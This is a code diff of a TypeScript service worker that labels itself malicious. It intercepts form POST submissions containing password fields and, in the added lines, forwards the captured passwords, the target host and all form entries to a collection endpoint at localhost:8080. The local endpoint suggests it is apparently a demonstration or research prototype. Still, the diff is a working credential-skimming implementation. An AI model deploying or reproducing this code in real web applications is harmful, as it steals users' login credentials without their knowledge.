@@ -9,11 +9,6 @@ self.addEventListener("activate", () => {
     self.clients.claim()
 })
 
-// @ts-expect-error More typing annoyances
-self.addEventListener("fetch", (event: FetchEvent) => {
-    console.log("Malicious service worker has intercepted the request")
-    event.respondWith(handleRequest(event.request))
-})
 
 let passwords:string[] = []
 self.addEventListener('message', (event: MessageEvent) => {
@@ -22,18 +17,31 @@ self.addEventListener('message', (event: MessageEvent) => {
     }
 });
 
+// @ts-expect-error More typing annoyances
+self.addEventListener("fetch", (event: FetchEvent) => {
+    console.log("Malicious service worker has intercepted the request")
+    event.respondWith(handleRequest(event.request))
+})
+
 async function handleRequest(req: Request) : Promise<Response> {
     if(req.method !== "GET") {
         if(req.method == "POST" && req.headers.get("Content-Type") === "application/x-www-form-urlencoded") {
             const clonedRequest = req.clone()
             const formData = await clonedRequest.formData()
             if([...formData.keys()].find(s => s.toLocaleLowerCase().includes("password"))) {
-                console.log(
-                    "Got Password",
-                    new URL(req.url).host,
-                    passwords,
-                    [...formData.entries()]
-                )
+                console.log("sending password")
+                fetch("http://localhost:8080/passwords", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        type: "x-www-form-urlencoded",
+                        host: new URL(req.url).host,
+                        inputPasswords: passwords,
+                        originalReq: Object.fromEntries([...formData.entries()])
+                    })
+                })
             }
 
         }
